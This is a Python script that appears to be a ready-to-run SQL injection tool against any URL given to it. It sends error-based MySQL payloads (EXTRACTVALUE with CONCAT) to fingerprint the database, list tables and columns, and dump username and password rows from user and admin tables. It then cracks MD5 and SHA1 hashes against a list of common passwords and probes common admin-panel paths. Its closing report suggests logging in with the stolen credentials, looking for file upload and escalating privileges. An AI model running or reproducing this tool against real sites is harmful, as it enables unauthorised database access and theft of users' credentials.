#!/usr/bin/env python3
"""
SQL Injection Exploitation Module - V3
With Password Hash Cracking Features
"""

import requests
import time
import sys
import re
import urllib3
import hashlib
import itertools
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SQLiExploiterV3:
    def __init__(self, target_url, verbose=False):
        self.target = target_url
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerable = False
        self.credentials_found = []
        
    def log(self, message):
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def extract_from_error(self, payload):
        """Extract data using error-based technique"""
        try:
            url = f"{self.target}{payload}"
            response = self.session.get(url)
            
            # Extract data from MySQL error messages
            error_patterns = [
                r"for column '(.*?)'",
                r"near '(.*?)' at line",
                r"'(.*?)'",
                r"column '(.*?)'"
            ]
            
            for pattern in error_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match and len(match.group(1)) > 2:
                    extracted = match.group(1)
                    # Clean common SQL artifacts
                    cleaned = extracted.replace("\\n", "").replace("\\r", "").strip()
                    if len(cleaned) > 3 and "union" not in cleaned.lower():
                        return cleaned
            
            return None
        except Exception as e:
            return f"Error: {str(e)}"
    
    def exploit_error_based(self):
        """Exploit using error-based techniques"""
        self.log("Using Error-Based Exploitation...")
        
        # Get database version
        version_payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, VERSION()))--"
        version = self.extract_from_error(version_payload)
        if version:
            self.log(f"üéØ MySQL VERSION: {version}")
        
        # Get database name
        db_payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, DATABASE()))--"
        db_name = self.extract_from_error(db_payload)
        if db_name:
            self.log(f"üéØ DATABASE: {db_name}")
        
        # Get current user
        user_payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, CURRENT_USER()))--"
        current_user = self.extract_from_error(user_payload)
        if current_user:
            self.log(f"üéØ CURRENT_USER: {current_user}")
        
        return db_name
    
    def extract_tables_error(self, db_name):
        """Extract tables using error-based"""
        self.log("Extracting tables using error-based...")
        
        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}')))--"
        tables = self.extract_from_error(payload)
        
        if tables and "error" not in tables.lower():
            table_list = tables.split(',')
            self.log(f"üìë TABLES FOUND: {len(table_list)}")
            for table in table_list:
                self.log(f"   ‚îî‚îÄ {table}")
            return table_list
        
        return []
    
    def extract_columns_error(self, table_name):
        """Extract columns using error-based"""
        self.log(f"Extracting columns from {table_name}...")
        
        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table_name}')))--"
        columns = self.extract_from_error(payload)
        
        if columns and "error" not in columns.lower():
            column_list = columns.split(',')
            self.log(f"üóÇÔ∏è COLUMNS in {table_name}: {len(column_list)}")
            for col in column_list:
                self.log(f"   ‚îî‚îÄ {col}")
            return column_list
        
        return []
    
    def dump_credentials(self, table_name):
        """Extract username and password data"""
        self.log(f"üîì Extracting credentials from {table_name}...")
        
        # Try to get multiple rows of credentials
        credentials = []
        
        for i in range(5):  # Try first 5 rows
            payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT(username, ':|:', password) FROM {table_name} LIMIT {i},1)))--"
            data = self.extract_from_error(payload)
            
            if data and "error" not in data.lower() and ":|:" in data:
                username, password = data.split(":|:", 1)
                credentials.append((username, password))
                self.log(f"   üë§ {username} : {password}")
                
                # Store for cracking
                self.credentials_found.append({
                    'username': username,
                    'password_hash': password,
                    'table': table_name
                })
        
        return credentials
    
    def identify_hash_type(self, hash_string):
        """Identify the type of hash"""
        hash_string = str(hash_string).strip()
        
        # Common hash patterns
        hash_patterns = {
            'md5': (32, r'^[a-f0-9]{32}$'),
            'sha1': (40, r'^[a-f0-9]{40}$'),
            'sha256': (64, r'^[a-f0-9]{64}$'),
            'sha512': (128, r'^[a-f0-9]{128}$'),
            'bcrypt': (60, r'^\$2[ayb]\$.{56}$'),
            'des': (13, r'^[a-zA-Z0-9./]{13}$'),
            'mysql': (16, r'^[a-f0-9]{16}$'),  # MySQL OLD_PASSWORD
            'wordpress': (34, r'^\$P\$.{31}$'),  # WordPress
        }
        
        for hash_type, (length, pattern) in hash_patterns.items():
            if len(hash_string) == length and re.match(pattern, hash_string):
                return hash_type
        
        # Check if it's plain text (short and no specific pattern)
        if len(hash_string) < 30 and not re.match(r'^[a-f0-9]+$', hash_string):
            return 'plaintext'
        
        return 'unknown'
    
    def crack_simple_hashes(self, hash_string, hash_type):
        """Try to crack simple hashes with common passwords"""
        self.log(f"üî® Attempting to crack {hash_type} hash...")
        
        common_passwords = [
            'admin', 'password', '123456', 'admin123', 'password123',
            'root', 'toor', 'pass', '1234', 'test', 'demo', 'guest'
        ]
        
        for password in common_passwords:
            if hash_type == 'md5':
                test_hash = hashlib.md5(password.encode()).hexdigest()
            elif hash_type == 'sha1':
                test_hash = hashlib.sha1(password.encode()).hexdigest()
            elif hash_type == 'plaintext':
                if password == hash_string:
                    return password
                continue
            else:
                continue
            
            if test_hash == hash_string.lower():
                self.log(f"‚úÖ CRACKED: {password}")
                return password
        
        return None
    
    def crack_passwords(self):
        """Main password cracking function"""
        self.log("üîì Starting password analysis and cracking...")
        
        if not self.credentials_found:
            self.log("‚ùå No credentials found to crack")
            return
        
        cracked_count = 0
        
        for cred in self.credentials_found:
            username = cred['username']
            password_hash = cred['password_hash']
            hash_type = self.identify_hash_type(password_hash)
            
            self.log(f"üîç Analyzing {username}'s password - Type: {hash_type}")
            
            if hash_type == 'plaintext':
                self.log(f"‚úÖ {username} : {password_hash} (PLAINTEXT)")
                cracked_count += 1
                cred['cracked_password'] = password_hash
                cred['hash_type'] = 'plaintext'
            
            else:
                # Try to crack the hash
                cracked = self.crack_simple_hashes(password_hash, hash_type)
                if cracked:
                    self.log(f"‚úÖ {username} : {cracked} (CRACKED from {hash_type})")
                    cracked_count += 1
                    cred['cracked_password'] = cracked
                    cred['hash_type'] = hash_type
                else:
                    self.log(f"‚ùå {username} : {password_hash} ({hash_type} - NOT CRACKED)")
                    cred['cracked_password'] = None
                    cred['hash_type'] = hash_type
        
        self.log(f"üìä Cracked {cracked_count}/{len(self.credentials_found)} passwords")
        return self.credentials_found
    
    def find_admin_panel(self):
        """Try to find admin login pages"""
        self.log("üåê Searching for admin panels...")
        
        common_admin_paths = [
            '/admin', '/wp-admin', '/administrator', '/login',
            '/admin.php', '/dashboard', '/cp', '/controlpanel',
            '/backend', '/manager', '/webadmin'
        ]
        
        base_url = self.target.split('?')[0]  # Remove parameters
        base_domain = '/'.join(base_url.split('/')[:3])  # Get domain only
        
        for path in common_admin_paths:
            try:
                test_url = base_domain + path
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    self.log(f"‚úÖ Admin panel found: {test_url}")
                    
                    # Check for login forms
                    if any(keyword in response.text.lower() for keyword in ['login', 'password', 'username', 'sign in']):
                        self.log(f"   üîê Login form detected!")
                        
            except:
                continue
    
    def generate_report(self):
        """Generate exploitation report"""
        self.log("\n" + "="*60)
        self.log("üìä EXPLOITATION REPORT")
        self.log("="*60)
        
        if self.credentials_found:
            self.log("üîì CREDENTIALS FOUND:")
            for cred in self.credentials_found:
                status = "‚úÖ CRACKED" if cred.get('cracked_password') else "‚ùå ENCRYPTED"
                self.log(f"   üë§ {cred['username']} : {cred.get('cracked_password', cred['password_hash'])} - {status}")
        
        self.log("\nüöÄ NEXT STEPS:")
        self.log("   1. Use cracked credentials to login to admin panel")
        self.log("   2. Look for file upload functionality")
        self.log("   3. Check for privilege escalation opportunities")
        self.log("   4. Document findings for security report")
    
    def exploit(self):
        """Main exploitation method"""
        self.log("üöÄ Starting SQL Injection Exploitation V3")
        self.log("=" * 60)
        
        # Test vulnerability
        test_payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, 'test'))--"
        test_result = self.extract_from_error(test_payload)
        
        if test_result and "test" in test_result:
            self.log("‚úÖ Error-Based Injection confirmed!")
            
            # Start exploitation
            db_name = self.exploit_error_based()
            
            if db_name:
                tables = self.extract_tables_error(db_name)
                
                # Focus on user/admin tables
                user_tables = [t for t in tables if any(word in t.lower() for word in ['user', 'admin', 'pass', 'account', 'customer', 'member'])]
                
                for table in user_tables:
                    columns = self.extract_columns_error(table)
                    
                    # Check if table has username and password columns
                    if columns and any('user' in col.lower() for col in columns) and any('pass' in col.lower() for col in columns):
                        self.dump_credentials(table)
                
                # Crack passwords
                if self.credentials_found:
                    self.crack_passwords()
                    
                    # Find admin panel
                    self.find_admin_panel()
                    
                    # Generate report
                    self.generate_report()
        
        self.log("=" * 60)
        self.log("üéØ Exploitation completed")

def main():
    if len(sys.argv) < 2:
        print("SQL Injection Exploitation Tool V3 - With Password Cracking")
        print("Usage: python3 sql_exploit_v3.py <TARGET_URL>")
        print("\nExample:")
        print('  python3 sql_exploit_v3.py "https://example.com/?id=1"')
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    if '?' not in target_url:
        target_url += "?id=1"
    
    exploiter = SQLiExploiterV3(target_url, verbose=True)
    exploiter.exploit()

if __name__ == "__main__":
    main()